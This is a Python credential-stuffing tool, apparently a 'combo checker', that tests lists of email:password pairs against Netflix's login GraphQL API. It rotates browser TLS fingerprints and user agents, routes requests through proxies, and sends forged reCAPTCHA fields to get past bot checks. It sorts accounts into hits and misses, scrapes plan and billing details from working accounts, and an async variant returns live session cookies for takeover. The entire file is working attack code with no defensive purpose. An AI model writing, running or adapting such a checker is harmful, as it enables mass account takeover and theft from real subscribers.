

import sys, os, json, re, uuid, random, string, urllib.parse
import threading, queue, time, traceback
from datetime import datetime
from collections import deque

if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

try:
    from curl_cffi import requests as creq
    CURL_OK = True
except ImportError:
    import requests as creq          
    CURL_OK = False


GRAPHQL_URL  = "https://web.prod.cloud.netflix.com/graphql"
PERSISTED_ID = "40d48207-9275-4fc4-b7da-352c2d1e5756"
PQ_VERSION   = 102
MAX_RETRY    = 3
TIMEOUT      = 22

CHROME_PROFILES = [
    "chrome124", "chrome123", "chrome120", "chrome119",
    "chrome116", "chrome110", "chrome107", "chrome104",
]

PHONE_CODES = {
    "AF":"93","AL":"355","DZ":"213","AR":"54","AM":"374","AU":"61","AT":"43",
    "AZ":"994","BH":"973","BD":"880","BE":"32","BR":"55","BN":"673","BG":"359",
    "KH":"855","CM":"237","CA":"1","CL":"56","CN":"86","CO":"57","HR":"385",
    "CZ":"420","DK":"45","EG":"20","EE":"372","FI":"358","FR":"33","GE":"995",
    "DE":"49","GH":"233","GR":"30","HU":"36","IN":"91","ID":"62","IR":"98",
    "IQ":"964","IE":"353","IL":"972","IT":"39","JP":"81","JO":"962","KZ":"7",
    "KE":"254","KR":"82","KW":"965","LB":"961","LV":"371","LT":"370","MY":"60",
    "MX":"52","MA":"212","NL":"31","NZ":"64","NG":"234","NO":"47","PK":"92",
    "PA":"507","PE":"51","PH":"63","PL":"48","PT":"351","QA":"974","RO":"40",
    "RU":"7","SA":"966","SN":"221","RS":"381","SG":"65","SK":"421","SI":"386",
    "ZA":"27","ES":"34","LK":"94","SE":"46","CH":"41","SY":"963","TW":"886",
    "TZ":"255","TH":"66","TN":"216","TR":"90","UA":"380","AE":"971","GB":"44",
    "US":"1","UY":"598","UZ":"998","VE":"58","VN":"84",
}


G  = '\033[92m'  
R  = '\033[91m'   
Y  = '\033[93m'   
B  = '\033[94m'   
C  = '\033[96m'   
DIM= '\033[90m'   
BD = '\033[1m'
RS = '\033[0m'

COLOR = {'HIT': G, 'BAD': R, 'FREE': Y, 'RETRY': B}


class Stats:
    def __init__(self, total: int):
        self._lk    = threading.Lock()
        self.total  = total
        self.done   = 0
        self.hit    = 0
        self.bad    = 0
        self.free   = 0
        self.retry  = 0
        self._ts    = deque(maxlen=300) 
        self.t0     = time.time()

    def add(self, kind: str):
        now = time.time()
        with self._lk:
            self.done += 1
            setattr(self, kind, getattr(self, kind) + 1)
            self._ts.append(now)

    @property
    def cpm(self):
        now = time.time()
        with self._lk:
            return sum(1 for t in self._ts if now - t <= 60)

    @property
    def elapsed(self):
        s = int(time.time() - self.t0)
        return f"{s//60:02d}:{s%60:02d}"


_flock = threading.Lock()

def _save(path: str, line: str):
    with _flock:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(line + '\n')


_plock = threading.Lock()

def _log(kind: str, msg: str):
    col = COLOR.get(kind, '')
    ts  = datetime.now().strftime('%H:%M:%S')
    with _plock:
        pass

def _bar(s: Stats):
    W    = 35
    pct  = s.done / s.total if s.total else 0
    fill = int(W * pct)
    bar  = f"{G}{'█'*fill}{DIM}{'░'*(W-fill)}{RS}"
    line = (f"\r {bar} {BD}{s.done}/{s.total}{RS} | "
            f"{G}HIT:{s.hit}{RS} {R}BAD:{s.bad}{RS} "
            f"{Y}FREE:{s.free}{RS} {B}RETRY:{s.retry}{RS} "
            f"| {C}CPM:{s.cpm}{RS} | {DIM}{s.elapsed}{RS}  ")
    with _plock:
        pass


def _between(text: str, left: str, right: str):
    i = text.find(left)
    if i < 0: return None
    i += len(left)
    j  = text.find(right, i)
    return text[i:j] if j >= 0 else None

def _unescape(s: str) -> str:
    return re.sub(r'\\x([0-9a-fA-F]{2})',
                  lambda m: chr(int(m.group(1), 16)), s)

def _ua() -> str:
    ver = random.choice(['124.0.0.0','123.0.0.0','120.0.0.0','119.0.0.0'])
    return (f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
            f'AppleWebKit/537.36 (KHTML, like Gecko) '
            f'Chrome/{ver} Safari/537.36')


def _extract_tokens(html: str, url: str):
    ss = su = av = None

    if 'serverState=' in url:
        qs = urllib.parse.urlparse(url).query
        ss = urllib.parse.parse_qs(qs).get('serverState', [None])[0]

    if not ss:
        for pat in ['"serverState":"', 'serverState%22%3A%22']:
            v = _between(html, pat, '"')
            if v and len(v) > 20 and not v.startswith('{'):
                ss = _unescape(v); break

    v = _between(html, '"serverScreenUpdate":"', '"')
    if v and len(v) > 20:
        su = _unescape(v)

    m = re.search(r'uiVersion["\s:]+["\']?(v[a-f0-9]{6,})', html)
    av = m.group(1) if m else 'vf45abb7a'

    return ss, su, av

def _next_state(text: str):
    try:
        return (json.loads(text)
                .get('data',{}).get('result',{})
                .get('screen',{}).get('serverState'))
    except Exception:
        return None

def _submit_cmds(text: str) -> list:
    out = []
    def walk(o, d=0):
        if d > 15: return
        if isinstance(o, dict):
            if (o.get('__typename') == 'CLCSRequestScreenUpdate'
                    and o.get('loggingCommand') == 'SubmitCommand'
                    and o.get('serverScreenUpdate')):
                out.append(o['serverScreenUpdate'])
            for v in o.values(): walk(v, d+1)
        elif isinstance(o, list):
            for i in o: walk(i, d+1)
    try: walk(json.loads(text))
    except Exception: pass
    return out

def _testids(text: str) -> set:
    res = set()
    def walk(o, d=0):
        if d > 15: return
        if isinstance(o, dict):
            if o.get('testId'): res.add(o['testId'])
            for v in o.values(): walk(v, d+1)
        elif isinstance(o, list):
            for i in o: walk(i, d+1)
    try: walk(json.loads(text))
    except Exception: pass
    return res

def _account_info(sess, ua: str, country: str) -> dict:
    try:
        r    = sess.get('https://www.netflix.com/youraccount',
                        headers={'Accept':'text/html','User-Agent':ua,
                                 'Accept-Language':f'{country}-{country}'},
                        timeout=12)
        html = r.text
        d = {}
        for k, pl, pr in [
            ('Plan',        '"localizedPlanName":{"fieldType":"String","value":"', '"'),
            ('Country',     '"currentCountry":"',                                  '"'),
            ('NextBilling', '"nextBillingDate":{"fieldType":"String","value":"',   '"'),
            ('MaxStreams',  '"maxStreams":{"fieldType":"Numeric","value":',         '},'),
        ]:
            v = _between(html, pl, pr)
            if v: d[k] = v.strip()
        return d
    except Exception:
        return {}

def _session(proxy_str=None):
    if CURL_OK:
        profile = random.choice(CHROME_PROFILES)
        sess = creq.Session(impersonate=profile)
    else:
        sess = creq.Session()

    if proxy_str:
        parts = proxy_str.strip().split(':')
        if len(parts) == 4:
            
            pu = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2:
        
            pu = f"http://{parts[0]}:{parts[1]}"
        else:
            pu = f"http://{proxy_str}"
        sess.proxies = {'http': pu, 'https': pu}

    return sess


def _gql(sess, op: str, ss: str, su: str, fields: list,
         av: str, country: str, lowcode: str, ua: str) -> str:
    loc = f'{lowcode}-{country.lower()}'
    h = {
        'X-Netflix.request.id':              ''.join(random.choices(string.hexdigits[:16], k=32)),
        'X-Netflix.context.operation-Name':  op,
        'X-Netflix.request.originating.url': f'https://www.netflix.com/{lowcode}/login',
        'X-Netflix.context.app-Version':     av,
        'X-Netflix.request.clcs.bucket':     'high',
        'X-Netflix.context.locales':         loc,
        'X-Netflix.context.ui-Flavor':       'akira',
        'X-Netflix.request.toplevel.uuid':   str(uuid.uuid4()),
        'X-Netflix.request.attempt':         '1',
        'X-Netflix.request.client.context':  '{"appstate":"foreground"}',
        'Accept':             '*/*',
        'Content-Type':       'application/json',
        'Accept-Language':    f'{country}-{country}',
        'User-Agent':         ua,
        'Origin':             'https://www.netflix.com',
        'Referer':            'https://www.netflix.com/',
        'Sec-Fetch-Site':     'same-site',
        'Sec-Fetch-Mode':     'cors',
        'Sec-Fetch-Dest':     'empty',
        'Sec-Ch-Ua':          '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        'Sec-Ch-Ua-Mobile':   '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Accept-Encoding':    'gzip, deflate, br',
    }
    body = {
        "operationName": op,
        "variables": {
            "format":            "HTML",
            "imageFormat":       "PNG",
            "locale":            loc.upper(),
            "serverState":       ss,
            "serverScreenUpdate": su or "",
            "inputFields":       fields,
        },
        "extensions": {
            "persistedQuery": {"id": PERSISTED_ID, "version": PQ_VERSION}
        }
    }
    r = sess.post(GRAPHQL_URL, headers=h, json=body, timeout=TIMEOUT)
    return r.text


def _check(email: str, password: str, proxy_str,
           country: str, lowcode: str, cc: str) -> tuple:

    ua = _ua()

    for attempt in range(MAX_RETRY):
        try:
            sess = _session(proxy_str)

  
            page = sess.get(
                f'https://www.netflix.com/{lowcode}/login',
                headers={
                    'Accept':                    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language':           f'{country}-{country}',
                    'Accept-Encoding':           'gzip, deflate, br',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Site':            'none',
                    'Sec-Fetch-Mode':            'navigate',
                    'Sec-Fetch-Dest':            'document',
                    'Sec-Fetch-User':            '?1',
                    'Sec-Ch-Ua':                 '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                    'Sec-Ch-Ua-Mobile':          '?0',
                    'Sec-Ch-Ua-Platform':        '"Windows"',
                    'User-Agent':                ua,
                },
                timeout=20, allow_redirects=True
            )

            ss, su, av = _extract_tokens(page.text, page.url)
            if not ss:
                if attempt < MAX_RETRY - 1:
                    time.sleep(random.uniform(1, 3))
                    continue
                return 'RETRY', 'serverState alinamadi'

         
            r1 = _gql(sess, 'CLCSScreenUpdate', ss, su or '',
                [{"name":"userLoginId",          "value":{"stringValue": email}},
                 {"name":"countryCode",           "value":{"stringValue": f"+{cc}"}},
                 {"name":"countryIsoCode",        "value":{"stringValue": country}},
                 {"name":"recaptchaError",        "value":{"stringValue": "RESPONSE_TIMED_OUT"}},
                 {"name":"recaptchaResponseTime", "value":{"intValue": random.randint(1200, 3000)}}],
                av, country, lowcode, ua)

            ns1   = _next_state(r1)
            cmds1 = _submit_cmds(r1)

            if not ns1:
                if attempt < MAX_RETRY - 1:
                    time.sleep(random.uniform(1, 3))
                    continue
                return 'RETRY', 'step1 state yok'

         
            r2 = _gql(sess, 'CLCSScreenUpdate', ns1, cmds1[0] if cmds1 else '',
                [{"name":"userLoginId",          "value":{"stringValue": email}},
                 {"name":"password",             "value":{"stringValue": password}},
                 {"name":"countryCode",          "value":{"stringValue": f"+{cc}"}},
                 {"name":"countryIsoCode",       "value":{"stringValue": country}},
                 {"name":"recaptchaResponseTime","value":{"intValue": random.randint(300, 800)}},
                 {"name":"recaptchaError",       "value":{"stringValue": "RESPONSE_TIMED_OUT"}}],
                av, country, lowcode, ua)

            low2 = r2.lower()
            tids = _testids(r2)

        
            if ('circle-checkmark' in r2
                    or 'navigating to /browse' in low2
                    or 'universal":"/browse' in low2):
                info  = _account_info(sess, ua, country)
                dstr  = ' | '.join(f"{k}:{v}" for k, v in info.items()) if info else ''
                return 'HIT', dstr

            if ('rejoin' in low2 or 'restart netflix' in low2
                    or 'reactivat' in low2 or 'tap the rejoin' in low2):
                return 'FREE', 'Former Member'

         
            NEVER_TIDS = {'registration-consent', 'email-consent', 'name-input',
                          'signupform', 'sign-up', 'field-firstName', 'continue-reg'}
            NEVER_KWS  = ['sign up', 'create account', 'get started with a new account',
                          'create your account', 'join today', 'start your membership']
            if (tids & NEVER_TIDS
                    or any(kw in low2 for kw in NEVER_KWS)):
                return 'FREE', 'Never Member'


            BAD_KWS  = ['incorrect', 'wrong password', 'invalid password',
                        'password is incorrect', 'try again']
            BAD_TIDS = {'field-password', 'sign-in-button', 'password-input'}
            if any(kw in low2 for kw in BAD_KWS) or (tids & BAD_TIDS):
                return 'BAD', ''

            if attempt < MAX_RETRY - 1:
                time.sleep(random.uniform(1.5, 4) * (attempt + 1))
                continue

            
            first_txt = ''
            try:
                d2 = json.loads(r2)
                def _fh(o, d=0):
                    if d > 10: return ''
                    if isinstance(o, dict):
                        pc = o.get('plainContent') or {}
                        if pc.get('value'): return pc['value'][:60]
                        for v in o.values():
                            r = _fh(v, d+1)
                            if r: return r
                    elif isinstance(o, list):
                        for i in o:
                            r = _fh(i, d+1)
                            if r: return r
                    return ''
                first_txt = _fh(d2)
            except Exception:
                pass
            return 'RETRY', first_txt or 'belirsiz'

        except Exception as exc:
            err = str(exc)[:60]
            if attempt < MAX_RETRY - 1:
                time.sleep(random.uniform(2, 5) * (attempt + 1))
                continue
            return 'RETRY', err

    return 'RETRY', 'max retry asildi'



import asyncio
import logging

logger = logging.getLogger(__name__)

async def check_combo_async(email: str, password: str, proxy_str: str = None) -> list[dict] | None:
    def _do_check():
        ua = _ua()
        country = 'us'
        lowcode = 'en'
        cc = '1'
        
        for attempt in range(MAX_RETRY):
            try:
                sess = _session(proxy_str)
                
                page = sess.get(
                    f'https://www.netflix.com/{lowcode}/login',
                    headers={
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': f'{country}-{country}',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Upgrade-Insecure-Requests': '1',
                        'Sec-Fetch-Site': 'none',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-User': '?1',
                        'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                        'Sec-Ch-Ua-Mobile': '?0',
                        'Sec-Ch-Ua-Platform': '"Windows"',
                        'User-Agent': ua,
                    },
                    timeout=20, allow_redirects=True
                )

                ss, su, av = _extract_tokens(page.text, page.url)
                if not ss:
                    if attempt < MAX_RETRY - 1:
                        time.sleep(random.uniform(1, 3))
                        continue
                    return None

                r1 = _gql(sess, 'CLCSScreenUpdate', ss, su or '',
                    [{"name":"userLoginId",          "value":{"stringValue": email}},
                     {"name":"countryCode",           "value":{"stringValue": f"+{cc}"}},
                     {"name":"countryIsoCode",        "value":{"stringValue": country}},
                     {"name":"recaptchaError",        "value":{"stringValue": "RESPONSE_TIMED_OUT"}},
                     {"name":"recaptchaResponseTime", "value":{"intValue": random.randint(1200, 3000)}}],
                    av, country, lowcode, ua)

                ns1   = _next_state(r1)
                cmds1 = _submit_cmds(r1)

                if not ns1:
                    if attempt < MAX_RETRY - 1:
                        time.sleep(random.uniform(1, 3))
                        continue
                    return None

                r2 = _gql(sess, 'CLCSScreenUpdate', ns1, cmds1[0] if cmds1 else '',
                    [{"name":"userLoginId",          "value":{"stringValue": email}},
                     {"name":"password",             "value":{"stringValue": password}},
                     {"name":"countryCode",          "value":{"stringValue": f"+{cc}"}},
                     {"name":"countryIsoCode",       "value":{"stringValue": country}},
                     {"name":"recaptchaResponseTime","value":{"intValue": random.randint(300, 800)}},
                     {"name":"recaptchaError",       "value":{"stringValue": "RESPONSE_TIMED_OUT"}}],
                    av, country, lowcode, ua)

                low2 = r2.lower()
                tids = _testids(r2)

                if ('circle-checkmark' in r2
                        or 'navigating to /browse' in low2
                        or 'universal":"/browse' in low2):
                    
                    # HIT! Extract cookies
                    cookies_list = []
                    for c in sess.cookies.jar:
                        cookies_list.append({
                            'name': c.name,
                            'value': c.value,
                            'domain': c.domain,
                            'path': c.path,
                            'secure': True,
                            'httpOnly': True
                        })
                    return cookies_list

                if ('rejoin' in low2 or 'restart netflix' in low2
                        or 'reactivat' in low2 or 'tap the rejoin' in low2):
                    return None # FREE

                NEVER_TIDS = {'registration-consent', 'email-consent', 'name-input',
                              'signupform', 'sign-up', 'field-firstName', 'continue-reg'}
                NEVER_KWS  = ['sign up', 'create account', 'get started with a new account',
                              'create your account', 'join today', 'start your membership']
                if (tids & NEVER_TIDS
                        or any(kw in low2 for kw in NEVER_KWS)):
                    return None # FREE

                BAD_KWS  = ['incorrect', 'wrong password', 'invalid password',
                            'password is incorrect', 'try again']
                BAD_TIDS = {'field-password', 'sign-in-button', 'password-input'}
                if any(kw in low2 for kw in BAD_KWS) or (tids & BAD_TIDS):
                    return None # BAD

                if attempt < MAX_RETRY - 1:
                    time.sleep(random.uniform(1.5, 4) * (attempt + 1))
                    continue

                return None # RETRY

            except Exception as exc:
                if attempt < MAX_RETRY - 1:
                    time.sleep(random.uniform(2, 5) * (attempt + 1))
                    continue
                return None
        return None

    try:
        return await asyncio.to_thread(_do_check)
    except Exception as e:
        logger.error(f"Combo check error for {email}: {e}")
        return None
